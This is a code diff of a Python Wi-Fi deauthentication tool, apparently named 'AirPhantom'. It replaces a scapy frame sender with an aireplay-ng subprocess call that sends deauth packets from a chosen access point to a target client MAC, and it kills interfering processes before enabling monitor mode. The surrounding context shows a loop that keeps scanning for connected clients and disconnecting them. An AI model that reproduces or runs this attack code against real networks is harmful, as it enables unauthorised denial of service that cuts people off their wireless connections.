@@ -1,9 +1,9 @@
 import os
 import time
 import subprocess
-from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
 
 def enable_monitor_mode(interface):
+    os.system("airmon-ng check kill")
     """Enable monitor mode on the specified interface."""
     os.system(f"airmon-ng start {interface}")
 
@@ -32,11 +32,33 @@ def get_bssid_from_essid(essid, interface):
             os.remove("temp_scan-01.csv")
 
 def deauth(target_mac, ap_mac, interface):
-    """Send deauthentication packets."""
-    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
-    deauth = Dot11Deauth(reason=7)
-    frame = RadioTap() / dot11 / deauth
-    sendp(frame, iface=interface, count=10, inter=0.2, verbose=False)
+    try:
+        # Construct the aireplay-ng command
+        command = [
+            "aireplay-ng",
+            "--deauth", "5",  # Number of deauth packets to send
+            "-a", ap_mac,     # AP MAC address
+            "-c", target_mac, # Target MAC address
+            interface         # Network interface
+        ]
+        
+        print(f"Executing: {' '.join(command)}")
+        
+        # Execute the command and capture the output
+        result = subprocess.run(command, capture_output=True, text=True)
+        
+        # Print stdout and stderr for debugging
+        print(result.stdout)
+        print(result.stderr)
+        
+        # Check if the command succeeded
+        if result.returncode == 0:
+            print("Deauthentication packets sent successfully.")
+        else:
+            print("Error sending deauthentication packets. Check the logs above.")
+    
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 def scan_for_clients(ap_bssid, interface, exclusions):
     """Continuously scan for connected clients and deauth them."""
@@ -73,13 +95,13 @@ def scan_for_clients(ap_bssid, interface, exclusions):
 
 if __name__ == "__main__":
     print(
-'''
+r'''
       _        _         _______  __                       _                        
      / \      (_)       |_   __ \[  |                     / |_                      
     / _ \     __   _ .--. | |__) || |--.   ,--.   _ .--. `| |-' .--.   _ .--..--.   
    / ___ \   [  | [ `/'`\]|  ___/ | .-. | `'_\ : [ `.-. | | | / .'`\ \[ `.-. .-. |  
  _/ /   \ \_  | |  | |   _| |_    | | | | // | |, | | | | | |,| \__. | | | | | | |  
-|____| |____|[___][___] |_____|  [___]|__]\\'-;__/[___||__]\__/ '.__.' [___||__||__] 
+|____| |____|[___][___] |_____|  [___]|__]\'-;__/[___||__]\__/ '.__.' [___||__||__] 
                                                                                     
 Made By:- Harsh Raj Singhania
 Email: raj.harshraut@gmail.com
@@ -106,5 +128,3 @@ Email: raj.harshraut@gmail.com
     finally:
         disable_monitor_mode(interface_mon)
         print("Monitor mode disabled. Exiting.")
-
-
